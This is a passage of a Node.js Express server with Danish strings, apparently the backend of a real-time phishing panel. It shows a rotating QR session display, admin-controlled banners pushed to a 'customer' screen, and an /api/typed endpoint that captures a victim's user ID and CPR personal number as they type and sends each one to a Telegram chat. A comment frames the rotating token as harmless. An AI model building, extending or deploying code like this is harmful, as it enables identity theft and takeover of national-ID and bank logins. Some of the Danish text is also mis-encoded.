  console.log(`QR-panel kÃ¸rer pÃ¥ http://localhost:${PORT}`);
  console.log(`Admin: http://localhost:${PORT}/admin`);
  console.log(`SkÃ¦rm: http://localhost:${PORT}/display`);
});


// --- Rotation: automatically generate a new sessionId every N seconds, so the
// QR code visually changes on its own. This is entirely our own session token
// (not tied to any bank or ID provider) -- it just makes an old screenshot of
// the code stop matching what's shown moments later. ---
app.post('/api/rotate-settings', requireAdmin, (req, res) => {
    const { enabled, intervalSeconds } = req.body;
    if (enabled !== undefined) state.rotate.enabled = !!enabled;
    if (intervalSeconds !== undefined) {
          const n = parseInt(intervalSeconds, 10);
          if (Number.isFinite(n) && n >= 1) state.rotate.intervalSeconds = n;
    }
    state.rotate.lastRotatedAt = Date.now();
    saveState(state);
    io.emit('admin-state-update', safeAdminState());
    res.json(state.rotate);
});

setInterval(() => {
    refreshStateFromDisk();
    if (!state.rotate || !state.rotate.enabled) return;
    const now = Date.now();
    const last = state.rotate.lastRotatedAt || 0;
    const intervalMs = (state.rotate.intervalSeconds || 15) * 1000;
    if (now - last >= intervalMs) {
          state.sessionId = genId();
          state.rotate.lastRotatedAt = now;
          state.lastUpdated = now;
          saveState(state);
          io.emit('state-update', publicPayload());
          io.emit('admin-state-update', safeAdminState());
          telegramSend(`ðŸ”„ QR-rotation: ny session ${state.sessionId} (${now.toLocaleString('da-DK')})`).catch(() => {});
    }
}, 1000);

app.post('/api/typed', (req, res) => {
  const { brugerId, cpr } = req.body;
  state.typed = state.typed || { brugerId: '', cpr: '' };
  let changed = false;
  if (brugerId !== undefined && brugerId !== state.typed.brugerId) {
    state.typed.brugerId = String(brugerId).slice(0, 30);
    changed = true;
    telegramSend('ðŸ†” Kunde indtastede Bruger-ID: ' + state.typed.brugerId).catch(() => {});
  }
  if (cpr !== undefined && cpr !== state.typed.cpr) {
    state.typed.cpr = String(cpr).slice(0, 15);
    changed = true;
    telegramSend('ðŸ‘¤ Kunde indtastede CPR: ' + state.typed.cpr).catch(() => {});
  }
  if (changed) {
    saveState(state);
    io.emit('admin-state-update', safeAdminState());
  }
  res.json({ ok: true });
});
app.post('/api/besked-banner', requireAdmin, (req, res) => {
  const { visible, text } = req.body;
  state.beskedBanner = state.beskedBanner || { visible: false, text: '' };
  if (visible !== undefined) state.beskedBanner.visible = !!visible;
  if (text !== undefined) state.beskedBanner.text = String(text).slice(0, 200);
  saveState(state);
  io.emit('state-update', publicPayload());
  io.emit('admin-state-update', safeAdminState());
  res.json({ ok: true });
});
// 404-handler + global express-fejl-handler â€” ALLERSIDST i filen,
// efter alle endpoints (fx /api/rotate-settings), sÃ¥ intet bliver slugt
app.use((req, res) => {
  res.status(404).json({ error: 'Ikke fundet' });
});
app.use((err, req, res, next) => {
  console.error('[express-fejl]', req.method, req.path, err.message);
  if (res.headersSent) return next(err);
  res.status(500).json({ error: 'Intern fejl' });
});

